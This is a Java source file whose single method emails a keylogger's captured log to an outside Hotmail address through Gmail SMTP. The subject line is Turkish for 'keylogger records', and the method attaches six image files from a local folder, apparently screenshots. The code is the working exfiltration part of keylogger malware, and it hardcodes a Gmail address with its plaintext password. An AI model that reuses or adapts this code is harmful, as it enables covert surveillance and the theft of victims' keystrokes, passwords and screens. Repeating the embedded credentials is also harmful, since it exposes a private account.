import java.io.IOException;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.*;
public class Mail {

	
	
	public void MailYolla(String log)
	{
		String from = "yigit.kurtcu@gmail.com";
		String pass = "yigit199696";
		String to = "yiqit-35@hotmail.com";
		String host = "smtp.gmail.com";
		Properties properties = System.getProperties();
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtp.host", host);
		properties.put("mail.smtp.user", from);
		properties.put("mail.smtp.password", pass);
		properties.put("mail.smtp.port", "587");
		properties.put("mail.smtp.auth", true);
		
		Session session = Session.getDefaultInstance(properties,new javax.mail.Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
	               return new PasswordAuthentication(from,pass);
		   }
	         });
		 
		try
		{
			MimeMessage message = new MimeMessage(session);
			message.setFrom(new InternetAddress(from));
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
			message.setSubject("Keylogger Kayýtlarý");
			
			
			MimeBodyPart messageBodyPart = new MimeBodyPart();
	         // Now set the actual message
	         
	          try
				{
	        	  messageBodyPart.setText(log);
				}
				catch(Exception e)
				{
					 messageBodyPart.setText("");
				}
	          
			    Multipart multipart = new MimeMultipart();		         
		         multipart.addBodyPart(messageBodyPart);


		         messageBodyPart = new MimeBodyPart();
		         for(int i = 0; i<6;i++)
		         {
		        	 String filename = "D:\\Sounds\\"+i+".jpg";
		        	MimeBodyPart attachPart = new MimeBodyPart();
		        	try {
						attachPart.attachFile(filename);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
		        	multipart.addBodyPart(attachPart);
		         }
		         

		         // Send the complete message parts
		         message.setContent(multipart);
		         
			Transport transport = session.getTransport("smtp");
			transport.connect(host,from,pass);
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();
		}
		catch(MessagingException mex)
		{
			mex.printStackTrace();
		}
	}
}
